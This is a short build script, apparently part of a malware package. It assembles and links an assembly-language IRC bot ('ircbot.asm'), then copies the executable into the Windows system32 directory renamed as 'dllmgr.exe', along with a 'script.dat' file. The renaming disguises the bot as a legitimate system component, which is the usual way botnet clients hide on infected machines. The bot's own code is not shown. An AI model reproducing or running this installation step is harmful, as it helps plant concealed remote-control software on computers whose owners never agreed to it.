   ml /c /coff /Cp ircbot.asm
   link /SUBSYSTEM:WINDOWS /LIBPATH:c:\masm\lib ircbot.obj
   del ircbot.obj

   copy ircbot.exe c:\winNT\system32\dllmgr.exe
   copy script.dat c:\winNT\system32
